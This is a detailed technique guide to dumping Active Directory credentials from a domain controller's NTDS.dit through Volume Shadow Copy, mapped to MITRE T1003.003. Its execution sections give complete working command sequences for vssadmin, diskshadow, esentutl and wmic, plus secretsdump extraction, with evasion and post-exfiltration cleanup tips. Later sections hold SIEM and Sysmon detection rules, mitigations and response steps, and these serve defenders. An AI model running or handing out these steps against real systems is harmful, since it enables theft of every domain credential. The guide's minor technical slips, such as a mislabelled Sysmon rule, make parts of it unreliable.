# [CA-DUMP-007]: VSS NTDS.dit Abuse

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | CA-DUMP-007 |
| **MITRE ATT&CK v18.1** | [T1003.003 - NTDS (VSS Variant)](https://attack.mitre.org/techniques/T1003/003/) |
| **Tactic** | Credential Access |
| **Platforms** | Windows Active Directory Domain Controllers (Server 2008 R2-2025) |
| **Severity** | Critical |
| **CVE** | N/A (inherent VSS design, not a vulnerability per se) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-02 |
| **Affected Versions** | Windows Server 2008 R2, 2012, 2012 R2, 2016, 2019, 2022, 2025 |
| **Patched In** | N/A (VSS is inherent to Windows; no patch exists) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

**Note:** All section numbers have been dynamically renumbered based on applicability to VSS-based NTDS.dit extraction.

---

## 2. EXECUTIVE SUMMARY

**Concept:** The Volume Shadow Copy Service (VSS) is a Windows backup infrastructure that creates point-in-time snapshots of volumes without requiring service interruption. While designed for legitimate backup operations, attackers with local administrator access can exploit VSS to create snapshots of the domain controller's C: drive and copy the locked NTDS.dit file directly from the snapshot. Unlike direct NTDS extraction methods (DCSync, ntdsutil), VSS exploitation bypasses file locks entirely by accessing a frozen copy of the filesystem. The attack uses only native Windows tools (vssadmin, diskshadow, esentutl, wmic), making it difficult to detect via binary signature-based monitoring.

**Attack Surface:** The primary attack surface is the Volume Shadow Copy Service itself, accessible through native tools vssadmin.exe, diskshadow.exe, wmic.exe, and esentutl.exe. Snapshots are mounted at paths like `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyN\Windows\NTDS\ntds.dit`. The attack requires local administrator or Backup Operators group membership. Three distinct VSS exploitation methods exist: (1) vssadmin (direct, requires admin), (2) diskshadow (scriptable, less monitored), (3) esentutl with /vss flag (integrated into backup utility).

**Business Impact:** **Complete domain credential compromise via file-locking bypass.** VSS exploitation extracts the NTDS.dit file without triggering typical "file access denied" alerts, as the snapshot is a frozen copy outside the normal locking mechanism. Once extracted and offline, the file yields all domain credentials including the krbtgt account hash (Golden Ticket attacks), domain admin accounts, and service account credentials. This method is particularly dangerous in environments with weak endpoint monitoring of VSS operations.

**Technical Context:** VSS abuse occurs post-compromise when the attacker achieves local admin access to a domain controller (often via lateral movement with compromised domain admin credentials). The operation is stealthy compared to direct NTDS access—no DCSync traffic, no ntdsutil service stops, no obvious registry access. VSS creation generates minimal forensic footprint: a few Event IDs in System log (7036), potential 8222 if auditing enabled, and file operations under GLOBALROOT paths.

### Operational Risk

- **Execution Risk:** Low-Medium - Requires admin; native tools only (minimal detection)
- **Stealth:** Medium-High - Uses built-in VSS service; less obvious than alternative methods
- **Reversibility:** No - Credentials compromised; requires password reset domain-wide

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.2.3.7 | Ensure domain controller backups are properly secured |
| **CIS Benchmark** | 2.3.4.13 | Ensure 'Volume Shadow Copy' service is not enabled |
| **DISA STIG** | WN16-DC-000200 | Domain controller must require LDAP channel signing |
| **NIST 800-53** | AC-2 | Account Management; AC-3 Access Enforcement |
| **NIST 800-53** | AU-12 | Audit Generation; monitor service starts |
| **GDPR** | Article 32 | Security of processing - protect domain credentials |
| **DORA** | Article 9 | Protection and prevention of ICT incidents |
| **NIS2** | Article 21 | Cyber risk management for critical infrastructure |
| **ISO 27001** | A.9.2.1 | Restrict access to information processing facilities (DCs) |
| **ISO 27001** | A.9.2.3 | Management of privileged access; VSS abuse prevention |
| **ISO 27005** | Section 7.4 | Risk assessment of VSS-based credential theft |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:** Local Administrator or Backup Operators group (vssadmin requires admin; diskshadow may work with Backup Operators in some scenarios)

**Required Access:** Local system access to domain controller; VSS service enabled (default)

**Supported Versions:**
- **Windows Server:** 2008 R2, 2012, 2012 R2, 2016, 2019, 2022, 2025
- **VSS Status:** Enabled by default on all versions
- **Tools:** Built-in Windows utilities (no external dependencies)

**Tools:**
- [vssadmin.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/vssadmin) (native, all versions)
- [diskshadow.exe](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc753205(v=ws.11)) (native, all versions)
- [esentutl.exe](https://docs.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/use-esentutl-utility-to-copy-locked-database-file) (native, all versions)
- [wmic.exe](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmic) (native, all versions)
- [ntdsutil.exe](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/manage/ntdsutil) (native, can use VSS)
- PowerShell 3.0+ (for scripting)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Reconnaissance – Check VSS Availability

**Verify VSS service is running and accessible:**

```powershell
# Check VSS service status
Get-Service -Name "VSS" | Select-Object Name, Status, StartType

# Expected: Running, Automatic (or Manual)

# Verify vssadmin is accessible
$vssadmin = "C:\Windows\System32\vssadmin.exe"
Test-Path $vssadmin
# Expected: True
```

**What to Look For:**
- VSS service running = can create snapshots
- vssadmin accessible = can use VSS tools
- If service stopped = requires elevation to start

### Reconnaissance – List Existing Shadow Copies

**Check if shadow copies already exist (useful for attacker):**

```powershell
# List all existing shadow copies
vssadmin list shadows

# Alternative: Check via WMI
Get-WmiObject -Class Win32_ShadowCopy | Select-Object ID, InstallDate, Description
```

**What to Look For:**
- Existing snapshots accessible = can use without creating new
- Multiple copies = choice of backup points
- Timestamps = identify recent backups

### Reconnaissance – Check Disk Space

**Verify sufficient disk space for shadow copy:**

```powershell
# Get C: drive free space
$drive = Get-Volume -DriveLetter C
$drive | Select-Object DriveLetter, SizeRemaining, Size

# Shadow copy typically requires 10-20% of volume size
# (depends on snapshot size)
```

**What to Look For:**
- Sufficient free space = can create snapshot
- Low space = snapshot may fail

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: vssadmin – Direct Shadow Copy Creation

**Supported Versions:** Windows Server 2008 R2-2025

**Prerequisites:** Local Administrator privileges

#### Step 1: Create Volume Shadow Copy

**Objective:** Create VSS snapshot of C: drive (where NTDS.dit resides).

**Command (All Versions):**

```cmd
vssadmin create shadow /for=C:
```

**Expected Output:**

```
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'C:\'.
  Shadow Copy ID: {3f3c4f5d-8c7b-4a9e-11f2-5e6d7c8b9a0f}
  Shadow Copy Set ID: {7a8b9c0d-1e2f-3a4b-5c6d-7e8f9a0b1c2d}
  Original Volume: \\?\Volume{12345678-1234-1234-1234-123456789012}\
  Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
  Original System Volume: C:\
  Shadow Copy Attributes: Persistent, Client-Accessible, No Auto Release, Differential
```

**What This Means:**
- Shadow copy successfully created
- HarddiskVolumeShadowCopy1 = access path to snapshot
- Snapshot contains frozen C: drive filesystem
- NTDS.dit now accessible from this path without locks

**OpSec & Evasion:**
- vssadmin.exe execution is logged (Process creation Event ID 4688)
- System Event ID 7036 shows VSS service activity
- Command-line arguments are visible in logs
- Detection likelihood: **Medium-High** (if process auditing enabled)

**Troubleshooting:**

| Error | Cause | Fix |
|-------|-------|-----|
| `Invalid command` | vssadmin create not available (client OS) | Use server OS or alternative method (diskshadow) |
| `Access Denied` | Insufficient privileges | Run as Administrator |
| `Insufficient storage space` | Disk full | Free disk space (typically 10-20% of volume) |
| `Already exists` | Shadow copy with same name | Use `/oldest` flag or different drive |

#### Step 2: Copy NTDS.dit from Shadow Copy

**Objective:** Extract NTDS.dit file from snapshot using copy command.

**Command (All Versions - Copy from Snapshot):**

```cmd
copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit" "C:\temp\ntds.dit"
```

Or using `xcopy` for recursive directories:

```cmd
xcopy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\*" "C:\temp\NTDS\" /E /I
```

**Expected Output:**

```
1 file(s) copied.
```

**What This Means:**
- NTDS.dit successfully copied from snapshot
- File is now accessible without locks
- No file-in-use errors (as copy source is snapshot, not live file)

**OpSec & Evasion:**
- File copy operations logged (potentially Event ID 4663)
- GLOBALROOT path is suspicious if monitored
- Cleanup: Delete copied files after exfiltration
- Detection likelihood: **High** (GLOBALROOT access is suspicious)

#### Step 3: Copy SYSTEM Hive (Required for Decryption)

**Objective:** Extract SYSTEM registry hive for SysKey decryption.

**Command (All Versions):**

```cmd
copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM" "C:\temp\system"
```

Also copy SECURITY hive:

```cmd
copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY" "C:\temp\security"
```

**What This Means:**
- SYSTEM hive contains SysKey for decrypting NTDS.dit
- SECURITY hive contains additional secrets
- Both required for offline hash extraction

---

### METHOD 2: diskshadow – Scriptable VSS Automation

**Supported Versions:** Windows Server 2008 R2-2025

**Prerequisites:** Local Administrator (or Backup Operators in some cases)

**Advantage:** Scriptable, less commonly monitored than vssadmin

#### Step 1: Create diskshadow Script

**Objective:** Automate VSS snapshot creation and mounting.

**Command (All Versions - Create Script File):**

```powershell
# Create diskshadow commands script
$script = @"
set context persistent nowriters
add volume c: alias temp
create
expose %temp% z:
"@

$script | Out-File -FilePath "C:\temp\diskshadow.txt" -Encoding ASCII
```

**What This Means:**
- Script file created with diskshadow commands
- set context persistent = snapshot persists after diskshadow exits
- add volume c: alias temp = alias for C: drive
- create = create snapshot
- expose %temp% z: = mount snapshot as Z: drive

#### Step 2: Execute diskshadow Script

**Objective:** Run diskshadow with script to automate process.

**Command (All Versions):**

```cmd
diskshadow.exe /s C:\temp\diskshadow.txt
```

**Expected Output:**

```
DISKSHADOW> set context persistent nowriters
DISKSHADOW> add volume c: alias temp
DISKSHADOW> create
Waiting for shadow copy creation...
...
Successfully created shadow copy.
DISKSHADOW> expose %temp% z:
DISKSHADOW> The shadow copy has been exposed as Z:\
DISKSHADOW> quit
```

**What This Means:**
- Shadow copy created and mounted as Z: drive
- Z:\Windows\NTDS\NTDS.dit directly accessible
- No need for GLOBALROOT paths
- More convenient than vssadmin method

**OpSec & Evasion:**
- diskshadow.exe execution logged (Event ID 4688)
- Script file creation may be monitored
- Z: drive mount is less suspicious than GLOBALROOT paths
- Detection likelihood: **Medium** (if diskshadow monitored)

#### Step 3: Copy NTDS.dit via Z: Drive

**Objective:** Extract NTDS from mounted Z: drive.

**Command (All Versions):**

```cmd
copy "Z:\Windows\NTDS\NTDS.dit" "C:\temp\ntds.dit"
copy "Z:\Windows\System32\config\SYSTEM" "C:\temp\system"
```

**What This Means:**
- Files copied from shadow copy via mounted drive letter
- More intuitive than GLOBALROOT paths
- Appears as normal file copy operation

#### Step 4: Unmount and Cleanup

**Objective:** Delete shadow copy and mounted drive.

**Command (All Versions):**

```cmd
# Delete the shadow copy
vssadmin delete shadows /shadow={SHADOW_ID} /quiet

# Or delete all
vssadmin delete shadows /all /quiet
```

Or via PowerShell:

```powershell
# Clean up shadow copies
Get-WmiObject -Class Win32_ShadowCopy | Remove-WmiObject
```

---

### METHOD 3: esentutl – Integrated VSS Copy Utility

**Supported Versions:** Windows Server 2008 R2-2025

**Prerequisites:** Local Administrator

**Advantage:** Single command copies via VSS without manual snapshot creation

#### Step 1: Direct Copy Using esentutl /vss

**Objective:** Use esentutl with VSS flag for integrated snapshot copy.

**Command (All Versions - Direct VSS Copy):**

```cmd
esentutl.exe /y /vss "C:\Windows\NTDS\NTDS.dit" /d "C:\temp\ntds.dit"
```

**Expected Output:**

```
Extensible Storage Engine Utilities for Microsoft(R) Windows(R)
Version 6.2
Initiating COPY mode...
Source Database: C:\Windows\NTDS\NTDS.dit
Destination Database: C:\temp\ntds.dit
Copying database headers...
Progress: 50%
Progress: 100%
Operation completed successfully in 2.34 seconds.
```

**What This Means:**
- esentutl internally creates VSS snapshot
- Copies NTDS.dit without stopping AD service
- /y flag = bypass confirmation prompts
- /vss flag = use Volume Shadow Copy Service
- Single command = less suspicious activity

**OpSec & Evasion:**
- esentutl.exe is a native Windows tool (less suspicious)
- Single process execution (less noisy than multi-step approach)
- File copy happens internally (less network/file IO monitoring)
- Detection likelihood: **Medium** (esentutl with /vss is known attack pattern)

**Command (Server 2008-2012 R2 - Slightly Different):**

```cmd
esentutl.exe /y /vss "C:\Windows\NTDS\NTDS.dit" /t "C:\temp\ntds.dit"
```

**Note:** /t flag used on older versions instead of /d

#### Step 2: Repair NTDS.dit (Optional but Recommended)

**Objective:** Repair any corruption from VSS copy.

**Command (All Versions):**

```cmd
esentutl.exe /p "C:\temp\ntds.dit" /8 /o
```

**Expected Output:**

```
Extensible Storage Engine Utilities for Microsoft(R) Windows(R)
Initiating REPAIR mode...
Source Database: C:\temp\ntds.dit
Repair Progress: 10%
Repair Progress: 50%
Repair Progress: 100%
Operation completed successfully in 12.45 seconds.
```

**What This Means:**
- Repairs any transaction log issues from snapshot copy
- /8 flag = 4KB page size (Windows 2008-2019)
- /32 flag = 32KB page size (Windows 2022+)
- /o flag = offline mode
- Makes file ready for hash extraction

---

### METHOD 4: wmic – WMI-Based Shadow Copy Creation

**Supported Versions:** Windows Server 2008 R2-2022 (deprecated in 2025)

**Prerequisites:** Local Administrator

#### Step 1: Create Shadow Copy via WMI

**Objective:** Use WMI to create VSS snapshot.

**Command (Server 2008 R2-2022):**

```cmd
wmic shadowcopy call create Volume=c:\
```

**Expected Output:**

```
Executing (\\PC-NAME\ROOT\CIMV2:Win32_ShadowCopy)->create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
  ReturnValue = 0;
  ShadowID = "{A1B2C3D4-5E6F-7A8B-9C0D-E1F2A3B4C5D6}";
};
```

**What This Means:**
- Shadow copy created via WMI
- ShadowID returned for reference
- Can be used with GLOBALROOT paths

#### Step 2: Extract ShadowID and Copy Files

**Objective:** Use returned ShadowID to access shadow copy.

**Command (All Versions):**

```cmd
# List shadow copies to get ID
wmic shadowcopy list brief

# Copy NTDS.dit using shadow ID
copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit" "C:\temp\ntds.dit"
```

---

### METHOD 5: Combined Approach – VSS + secretsdump.py (Offline Extraction)

**Supported Versions:** All Server versions

**Prerequisites:** Local admin, Python 3.6+

#### Step 1-3: Create VSS and Extract Files (via Methods 1-3 above)

(Follow vssadmin, diskshadow, or esentutl steps to get NTDS.dit and SYSTEM hive)

#### Step 4: Offline Hash Extraction

**Objective:** Extract domain credentials from NTDS files offline.

**Command (Linux/Kali - secretsdump.py):**

```bash
# Extract hashes from offline NTDS.dit
python3 -m impacket.examples.secretsdump \
  -ntds C:\temp\ntds.dit \
  -system C:\temp\system \
  -security C:\temp\security \
  LOCAL > credentials.txt
```

**Expected Output:**

```
Impacket v0.9.25 - Copyright 2021 SecureAuth Corporation

[*] Dumping domain cached credentials (domain\uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7ef556ffd1ac36f20373a3c0c03e7fc6:::
jsmith:1000:aad3b435b51404eeaad3b435b51404ee:d0352ee2e8a0aa9ad8f0f2f4ea6ac5d1:::
[*] Kerberos keys extracted
[*] Searching for Domain Policy
[*] DPAPI Domain backup key extraction
```

**What This Means:**
- All domain credentials extracted
- krbtgt hash available for Golden Tickets
- Fully offline (no further DC access needed)

---

## 6. ATTACK SIMULATION & VERIFICATION

#### Atomic Red Team – T1003.003

**Atomic Test ID:** T1003.003-2 (VSS variant)

**Test Name:** NTDS.dit Extraction via Volume Shadow Copy

**Description:** Simulates VSS-based NTDS.dit extraction using vssadmin.

**Supported Versions:** All Server versions

**Command:**

```powershell
Invoke-AtomicTest T1003.003 -TestNumbers 2
```

Or manually:

```powershell
# Atomic simulation - VSS shadow copy dump
vssadmin create shadow /for=C:
copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit" "C:\temp\ntds.dit"
copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM" "C:\temp\system"
```

**Cleanup:**

```powershell
vssadmin delete shadows /all /quiet
Remove-Item "C:\temp\ntds.dit" -Force
Remove-Item "C:\temp\system" -Force
```

---

## 7. TOOLS & COMMANDS REFERENCE

### vssadmin.exe (Native Windows)

**Version:** Included in all Server versions 2008 R2+

**Usage:**

```
vssadmin create shadow /for=C:
vssadmin list shadows
vssadmin delete shadows /all /quiet
```

---

### diskshadow.exe (Native Windows)

**Version:** Included in all Server versions 2008 R2+

**Script Format:**

```
set context persistent nowriters
add volume c: alias temp
create
expose %temp% z:
```

**Usage:**

```cmd
diskshadow.exe /s C:\temp\diskshadow.txt
```

---

### esentutl.exe (Native Windows)

**Version:** Included in all Server versions 2008 R2+

**Usage:**

```
esentutl /y /vss "C:\Windows\NTDS\NTDS.dit" /d "C:\temp\ntds.dit"
esentutl /p "C:\temp\ntds.dit" /8 /o
```

---

### wmic.exe (Native Windows – Deprecated)

**Version:** Available until Server 2022 (deprecated in 2025)

**Usage:**

```cmd
wmic shadowcopy call create Volume=c:\
wmic shadowcopy list brief
```

---

## 8. SPLUNK DETECTION RULES

### Rule 1: VSS Service Activity and Shadow Copy Creation

**Rule Configuration:**
- **Required Index:** main (Windows System logs)
- **Required Sourcetype:** WinEventLog:System
- **Required Fields:** EventCode, Source, Message
- **Alert Threshold:** > 0 events (immediate)
- **Applies To Versions:** All Server versions

**SPL Query:**

```spl
index=main sourcetype="WinEventLog:System" 
  (EventCode=7036 AND Source="Service Control Manager") AND
  (Message="*Volume Shadow Copy Service*" OR Message="*VSS*") AND
  (Message="*entered the running state*" OR Message="*entered the stopped state*")
| stats count by host, Message, TimeGenerated
| where count >= 1
```

**What This Detects:**
- VSS service start/stop (Event 7036)
- Suspicious timing around NTDS extraction
- Unexpected VSS service activity

---

### Rule 2: Shadow Copy Creation Event

**Rule Configuration:**
- **Required Index:** main
- **Required Sourcetype:** WinEventLog:System
- **Required Fields:** EventCode, Message
- **Alert Threshold:** > 0 events

**SPL Query:**

```spl
index=main sourcetype="WinEventLog:System" EventCode=8222
| stats count by host, Message
| where count >= 1
```

**What This Detects:**
- Direct Event ID 8222 (shadow copy created) if available
- May not appear on all systems (requires auditing)

---

### Rule 3: Process Execution – VSS Tools

**Rule Configuration:**
- **Required Index:** main
- **Required Sourcetype:** WinEventLog:Security
- **Required Fields:** EventCode, Image, CommandLine
- **Alert Threshold:** Immediate

**SPL Query:**

```spl
index=main sourcetype="WinEventLog:Security" EventCode=4688
  (Image="*vssadmin*" OR Image="*diskshadow*" OR Image="*esentutl*")
  AND (CommandLine="*shadow*" OR CommandLine="*/vss*" OR CommandLine="*create*")
| stats count by host, Account_Name, Image, CommandLine
```

**What This Detects:**
- Execution of VSS-related tools with suspicious arguments
- vssadmin/diskshadow/esentutl process creation
- Shadow copy and VSS operations

---

## 9. MICROSOFT SENTINEL DETECTION

### Query 1: VSS-Related Process Execution

**Rule Configuration:**
- **Required Table:** SecurityEvent, DeviceProcessEvents
- **Required Fields:** EventID, Image, CommandLine
- **Alert Severity:** High
- **Frequency:** Real-time
- **Applies To Versions:** All Server versions

**KQL Query:**

```kusto
SecurityEvent
| where EventID == 4688
| where tolower(NewProcessName) has_any ("vssadmin", "diskshadow", "esentutl", "wmic")
| where CommandLine has_any ("shadow", "/vss", "create", "expose", "call create Volume")
| extend AccountCustomEntity = Account
| extend HostCustomEntity = Computer
| extend ProcessPath = NewProcessName
| project TimeGenerated, Computer, Account, Image=NewProcessName, CommandLine
| summarize Count = count(), Hosts = dcount(Computer) by Computer, Account, Image
| where Count >= 1
```

---

### Query 2: NTDS.dit File Access from Shadow Copy Paths

**Rule Configuration:**
- **Required Table:** SecurityEvent, DeviceFileEvents
- **Alert Severity:** Critical

**KQL Query:**

```kusto
SecurityEvent
| where EventID in (4663, 4656)
| where ObjectName has_any ("NTDS.dit", "GLOBALROOT", "HarddiskVolumeShadowCopy", "system", "config\\SYSTEM")
| where SubjectUserName !contains "SYSTEM"
| extend AccountCustomEntity = SubjectUserName
| extend HostCustomEntity = Computer
```

---

## 10. WINDOWS EVENT LOG MONITORING

**Event ID: 7036 (Service State Change)**

- **Log Source:** System
- **Trigger:** VSS service enters running/stopped state
- **Filter:** Source="Service Control Manager" AND Message contains "Volume Shadow Copy"
- **Applies To Versions:** All Server versions

**Configuration:**
- Enable System event logging (default enabled)
- Forward to central SIEM
- Alert on VSS service start on domain controllers (unusual)

**Event ID: 8222 (Shadow Copy Created)**

- **Log Source:** System
- **Trigger:** Shadow copy snapshot created
- **Applies To Versions:** All Server versions (if NTDS VSS writer enabled)

**Event ID: 4688 (Process Creation)**

- **Log Source:** Security
- **Trigger:** vssadmin.exe, diskshadow.exe, esentutl.exe launched
- **Filter:** Image contains VSS-related tool names

---

## 11. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+

**Supported Platforms:** All Windows Server versions

**Sysmon Configuration Snippet:**

```xml
<!-- Detect VSS abuse and NTDS extraction -->
<Sysmon schemaversion="4.22">
  <EventFiltering>
    <!-- Event ID 1: Process Creation - VSS tools -->
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains any">vssadmin shadow; diskshadow; esentutl /vss; wmic shadowcopy</CommandLine>
    </ProcessCreate>
    
    <!-- Event ID 3: Network Connection (if exfiltrating) -->
    <NetworkConnect onmatch="include">
      <CommandLine condition="contains">ntds.dit</CommandLine>
    </NetworkConnect>
    
    <!-- Event ID 11: FileCreate (NTDS copy) -->
    <FileCreate onmatch="include">
      <TargetFilename condition="contains">NTDS.dit</TargetFilename>
    </FileCreate>
    
    <!-- Event ID 17: Pipe Created (diskshadow script) -->
    <CreateRemoteThread onmatch="include">
      <SourceImage condition="contains">diskshadow</SourceImage>
    </CreateRemoteThread>
  </EventFiltering>
</Sysmon>
```

---

## 12. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts

**Alert Name:** "Suspicious Shadow Copy creation" / "NTDS.dit extraction attempt"

- **Severity:** Critical
- **Description:** Detects VSS shadow copy creation on domain controller followed by NTDS.dit access
- **Applies To:** DCs with Defender for Servers enabled
- **Remediation:** Isolate DC, review recent admin actions, reset krbtgt immediately

**Manual Configuration:**

1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings** → Select subscription
3. Enable **Defender for Servers**
4. Review **Security alerts** for VSS-related alerts

---

## 13. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

#### M365 Audit Query (Post-Compromise)

```powershell
# Monitor for suspicious admin activity post-NTDS extraction
Search-UnifiedAuditLog -Operations "Add-RoleGroupMember" `
  -StartDate (Get-Date).AddDays(-1) -ResultSize 1000 | `
  Export-Csv "C:\audit_admin_changes.csv"
```

---

## 14. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Disable VSS on Domain Controllers (If Not Required)**

Removes the VSS attack surface entirely.

**Applies To Versions:** All Server versions

**Manual Steps (PowerShell):**

```powershell
# Disable VSS service
Stop-Service -Name "VSS" -Force
Set-Service -Name "VSS" -StartupType Disabled

# Verify disabled
Get-Service -Name "VSS" | Select-Object Status, StartType
# Expected: Stopped, Disabled
```

**Important:** Only disable if VSS not used for legitimate backups. Many organizations use VSS for Hyper-V backups, so this may not be feasible.

---

**2. Restrict Administrative Access to Domain Controllers**

Prevent attackers from reaching DC console.

**Manual Steps:**

1. Implement strict network segmentation (DC in isolated VLAN)
2. Restrict RDP access to specific admin IPs
3. Enforce MFA for RDP sessions
4. Monitor and alert on all admin access

```powershell
# Configure RDP access restrictions via Group Policy
# Computer Configuration → Windows Settings → Security Settings → Local Policies
# User Rights Assignment → "Allow log on through Remote Desktop Services"
# Add only specific admin groups
```

---

**3. Enable Comprehensive Auditing of VSS Operations**

Detect VSS abuse through logging.

**Applies To Versions:** All Server versions

**Manual Steps (Group Policy):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to: **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **System Audit Policies**
3. Enable: **Audit System Events** (both Success and Failure)
4. Click **Apply**
5. Run `gpupdate /force`

**Manual Steps (PowerShell):**

```powershell
# Enable detailed system auditing
auditpol /set /subcategory:"System" /success:enable /failure:enable

# Verify
auditpol /get /subcategory:"System"
# Expected: System Success and Failure
```

---

### Priority 2: HIGH

**4. Monitor Shadow Copy Creation Events**

Alert immediately on suspicious VSS activity.

**Manual Steps:**

1. Configure SIEM to alert on Event ID 7036 (VSS service state changes)
2. Baseline normal VSS activity (backups)
3. Alert on deviations (unexpected VSS starts)
4. Investigate all vssadmin/diskshadow process executions on DCs

---

**5. Implement File Integrity Monitoring on NTDS.dit**

Detect unauthorized access/copies.

**Manual Steps:**

1. Configure file auditing on `C:\Windows\NTDS\NTDS.dit`
2. Monitor for read/copy operations by non-system accounts
3. Alert on handle requests to NTDS files
4. Enable Event ID 4663 logging (Object Access)

**PowerShell Configuration:**

```powershell
# Set audit ACL on NTDS.dit
$ACL = Get-Acl -Path "C:\Windows\NTDS\NTDS.dit"
$AuditRule = New-Object System.Security.AccessControl.FileSystemAuditRule(
  "Everyone",
  [System.Security.AccessControl.FileSystemRights]::ReadData,
  [System.Security.AccessControl.InheritanceFlags]::None,
  [System.Security.AccessControl.PropagationFlags]::None,
  [System.Security.AccessControl.AuditFlags]::Success -bor [System.Security.AccessControl.AuditFlags]::Failure
)
$ACL.AddAuditRule($AuditRule)
Set-Acl -Path "C:\Windows\NTDS\NTDS.dit" -AclObject $ACL
```

---

## 15. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Processes:**
- `vssadmin.exe create shadow`
- `diskshadow.exe /s` with script files
- `esentutl.exe /vss /y`
- `wmic shadowcopy call create`

**Files:**
- `C:\temp\ntds.dit`, `C:\temp\NTDS.dit`
- `C:\temp\system`, `C:\temp\SYSTEM`
- Diskshadow script files (`diskshadow.txt`, etc.)
- Z: or other mounted shadow copy drive letters

**Paths:**
- `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy*\Windows\NTDS\*`
- Any access to these UNC paths from non-backup processes

**Event Logs:**
- Event ID 7036 (VSS service activity)
- Event ID 8222 (Shadow copy created)
- Event ID 4688 (Process: vssadmin, diskshadow, esentutl)

### Forensic Artifacts

**Disk:**
- Shadow copy files on disk (if persistent snapshots created)
- Temporary NTDS.dit copies in C:\temp, user profiles
- Diskshadow script files
- Event logs: Security.evtx, System.evtx

**Memory:**
- Process handles to NTDS.dit
- VSS service memory structures
- File copy operations in memory

**System:**
- VSS Writer status (NTDS VSS writer may show activity)
- Registry: VSS configuration and previous snapshots

### Response Procedures

**1. Immediate Containment:**

```powershell
# Delete all shadow copies immediately
vssadmin delete shadows /all /quiet

# Stop VSS service
Stop-Service -Name "VSS" -Force
Set-Service -Name "VSS" -StartupType Disabled

# Isolate DC from network (if severe compromise)
Disable-NetAdapter -Name "Ethernet" -Confirm:$false
```

**2. Credential Reset (CRITICAL - Assume Compromise):**

```powershell
# Reset krbtgt password TWICE
Set-ADAccountPassword -Identity krbtgt -NewPassword (ConvertTo-SecureString "TempPassword!$(Get-Random)" -AsPlainText -Force)
Start-Sleep -Seconds 36000  # Wait 10 hours

Set-ADAccountPassword -Identity krbtgt -NewPassword (ConvertTo-SecureString "FinalPassword!$(Get-Random)" -AsPlainText -Force)

# Reset all domain user passwords
Get-ADUser -Filter {Enabled -eq $true} | ForEach-Object {
  $Pass = ConvertTo-SecureString "TempPass!$(Get-Random)" -AsPlainText -Force
  Set-ADAccountPassword -Identity $_.SamAccountName -NewPassword $Pass
  Set-ADUser -Identity $_.SamAccountName -ChangePasswordAtLogon $true
}
```

**3. Collect Evidence:**

```powershell
wevtutil epl Security C:\Evidence\Security.evtx
wevtutil epl System C:\Evidence\System.evtx
```

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [T1566.002] Phishing | Attacker gains initial access |
| **2** | **Execution** | [T1204.002] User Execution | Victim executes malware |
| **3** | **Persistence** | [T1547.001] Autostart | Malware persists |
| **4** | **Privilege Escalation** | [T1548] UAC Bypass | Escalate to admin |
| **5** | **Lateral Movement** | [T1021.001] RDP | Move to domain controller |
| **6** | **Credential Access** | **[CA-DUMP-007] VSS NTDS Abuse** | **Dump NTDS via shadow copy** |
| **7** | **Impact** | [T1485] Data Destruction | Deploy ransomware domain-wide |

---

## 17. REAL-WORLD EXAMPLES

### Example 1: Mustang Panda – VSS-Based NTDS.dit Extraction (2020-2021)

- **Target:** US defense contractors, Asian governments
- **Timeline:** 2020-2021
- **Technique Status:** Mustang Panda used vssadmin to create shadow copies and extracted NTDS.dit from compromised DCs
- **Impact:** Long-term persistence; credentials harvested for lateral movement
- **Reference:** [Palo Alto Unit 42 - Mustang Panda](https://unit42.paloaltonetworks.com/adversary-ops-flying-carpet/)

---

### Example 2: APT28 (Fancy Bear) – NTDS via VSS (2015-2018)

- **Target:** NATO allies, EU government agencies
- **Timeline:** 2015-2018
- **Technique Status:** APT28 used combinations of vssadmin and ntdsutil to extract NTDS.dit from compromised DCs
- **Impact:** Exfiltration of classified intelligence; long-term access to government networks
- **Reference:** [MITRE ATT&CK - APT28](https://attack.mitre.org/groups/G0007/)

---

### Example 3: Wizard Spider – VSS + Ransomware (2019-2021)

